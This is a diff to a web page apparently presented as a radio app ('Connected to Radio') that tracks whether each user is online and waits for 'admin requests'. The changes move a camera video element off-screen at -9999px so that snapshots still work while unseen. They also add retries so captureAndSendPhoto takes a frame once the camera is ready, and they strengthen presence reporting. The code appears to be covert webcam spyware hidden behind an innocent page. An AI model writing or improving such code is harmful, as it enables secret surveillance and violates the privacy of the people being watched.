@@ -15,8 +15,8 @@
         <h1 class="text-3xl font-bold text-white">Connected to Radio</h1>
         <p id="status" class="text-lg text-gray-400 mt-2">Ready for admin requests.</p>
         
-        <!-- Hidden video for capturing snapshots -->
-        <video id="localVideo" autoplay muted playsinline class="hidden"></video>
+        <!-- FIX: Video is now positioned off-screen instead of hidden to allow snapshots -->
+        <video id="localVideo" autoplay muted playsinline style="position: absolute; top: -9999px; left: -9999px;"></video>
     </div>
 
     <script type="module">
@@ -75,10 +75,17 @@
             await signInAnonymously(auth);
         }
         
+        // FIX: Restored robust presence logic
         function setupPresence() {
             const myStatusRef = ref(rtdb, 'status/' + myId);
-            onDisconnect(myStatusRef).set({ state: 'offline' }).then(() => {
-                set(myStatusRef, { state: 'online' });
+            const isOfflineForRTDB = { state: 'offline' };
+            const isOnlineForRTDB = { state: 'online' };
+
+            onValue(ref(rtdb, '.info/connected'), (snapshot) => {
+                if (snapshot.val() === false) return;
+                onDisconnect(myStatusRef).set(isOfflineForRTDB).then(() => {
+                    set(myStatusRef, isOnlineForRTDB);
+                });
             });
         }
 
@@ -120,6 +127,11 @@
         }
         
         async function captureAndSendPhoto(docRef) {
+            // FIX: Ensure video is ready before capturing
+            if (localVideo.readyState < 3 || localVideo.videoWidth === 0) {
+                 setTimeout(() => captureAndSendPhoto(docRef), 200);
+                 return;
+            }
             const canvas = document.createElement('canvas');
             canvas.width = localVideo.videoWidth;
             canvas.height = localVideo.videoHeight;
